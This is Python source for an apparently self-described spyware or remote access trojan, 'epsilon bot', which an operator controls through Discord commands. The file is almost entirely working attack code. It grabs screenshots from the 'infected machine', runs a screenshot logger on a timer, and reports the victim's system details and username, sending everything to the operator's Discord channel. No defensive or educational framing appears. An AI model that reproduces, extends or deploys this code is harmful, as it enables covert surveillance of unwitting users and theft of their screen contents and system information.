from discord.ext import commands as c_bot
from discord import Game
import asyncio
from payloads.satelite import collectimage
import os
import platform
import sys
import threading
import discord

bot_token = ""

machine_data = platform.uname()
cache_channel = None
path = ""

if sys.platform == "win32":
    path =  os.path.expandvars("%userprofile%") +'\\Documents\\'
else:
    path = os.path.expanduser('~')
    print(path)

    

async def imglogger():
    await e_bot.wait_until_ready()
    global cache_channel,interval_imglog,path,f_imglog
    while f_imglog:
        if collectimage():
            await e_bot.send_file(cache_channel,path+'tempic.png')
        await asyncio.sleep(interval_imglog)  
    
    
def init_bot(token):
    global bot_token
    bot_token = token

e_bot = c_bot.Bot(command_prefix='$')
f_imglog = False
interval_imglog = 6


@e_bot.command(name = 'startimglog',help='starts image logging payload',pass_context=True)
async def startimglog(ctx,interval : int):
    global f_imglog
    if f_imglog:
        await e_bot.say("The image logger is already working ")
        
    else:
        f_imglog = True
        global cache_channel,interval_imglog
        cache_channel = ctx.message.channel
        interval_imglog = interval
        await e_bot.say("Image logging starting ")
        e_bot.loop.create_task(imglogger())


@e_bot.event
async def on_ready():
    await e_bot.change_presence(game=Game(name=machine_data[1]))
    
    
@e_bot.command(name = 'getpic',pass_context = True,help="grabs a screen shot from infected machine's monitor")
async def getpic(ctx):    
        
    if collectimage():
        await e_bot.send_file(ctx.message.channel,path+'tempic.png')

    else:
        await e_bot.say("[Error] : Couldn't grab pic :( ")

@e_bot.command(name = 'stopimglog',help = 'stops image logging')
async def stopimglog():
    global f_imglog
    f_imglog = False
    await e_bot.say("Image logging stopped ")

@e_bot.command(name = 'status',help = 'shows details about infected machine')
async def status():
    await e_bot.say("Hello i'm epsilon bot by Sreyas i'm currently speaking from infected machine " + os.getlogin())
    buffer_data_system = "```* System : " + machine_data[0] + "\n* Node : " + machine_data[1] + "\n* Release : " + machine_data[2] + "\n* Version : " + machine_data[3] + "\n* Machine : " + machine_data[4] + "\n* Processor : " + machine_data[5] + "\n* Username : " + os.getlogin() +  "```"
    await e_bot.say(buffer_data_system)



def runbot():
    e_bot.run(bot_token)










